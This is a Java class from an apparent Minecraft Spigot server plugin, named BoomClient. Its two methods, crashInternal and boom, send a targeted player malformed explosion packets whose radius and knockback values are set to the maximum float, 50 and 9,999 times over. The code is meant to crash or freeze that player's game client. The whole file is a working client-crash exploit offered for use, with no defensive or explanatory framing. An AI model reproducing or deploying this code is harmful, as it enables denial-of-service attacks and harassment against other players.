package net.lanternmc.r1_8.PlayerManager;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import net.lanternmc.Tools4LMCSpigot;
import org.bukkit.Location;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;

public class BoomClient {
    public static boolean crashInternal(Player var1) {
        PacketContainer var2 = new PacketContainer(PacketType.Play.Server.EXPLOSION);
        Location var3 = var1.getLocation();
        var2.getDoubles().write(0, var3.getX());
        var2.getDoubles().write(1, var3.getY());
        var2.getDoubles().write(2, var3.getZ());
        var2.getFloat().write(0, 3.4028235E38F);
        var2.getSpecificModifier(List.class).write(0, new ArrayList(0));
        var2.getFloat().write(1, 3.4028235E38F);
        var2.getFloat().write(2, 3.4028235E38F);
        var2.getFloat().write(3, 3.4028235E38F);
        try {
            for(int var4 = 0; var4 < 50; ++var4) {
                Tools4LMCSpigot.protocolManager.sendServerPacket(var1, var2, false);
            }
            return true;
        } catch (Exception var5) {
            return false;
        }
    }



    /**
     * 炸人
     * @param player
     * @throws InvocationTargetException
     */
    public static void boom(Player player) throws InvocationTargetException {
        PacketContainer sendpacket = new PacketContainer(PacketType.Play.Server.EXPLOSION);
        Location l = player.getLocation();
        sendpacket.getDoubles().write(0, l.getX());
        sendpacket.getDoubles().write(1, l.getY());
        sendpacket.getDoubles().write(2, l.getZ());
        sendpacket.getFloat().write(0, Float.MAX_VALUE);
        sendpacket.getSpecificModifier(List.class).write(0, new ArrayList(0));
        sendpacket.getFloat().write(1, Float.MAX_VALUE);
        sendpacket.getFloat().write(2, Float.MAX_VALUE);
        sendpacket.getFloat().write(3, Float.MAX_VALUE);
        for (int i = 1; i <= 9999; i++) {
            Tools4LMCSpigot.protocolManager.sendServerPacket(player, sendpacket, false);
        }
    }
}
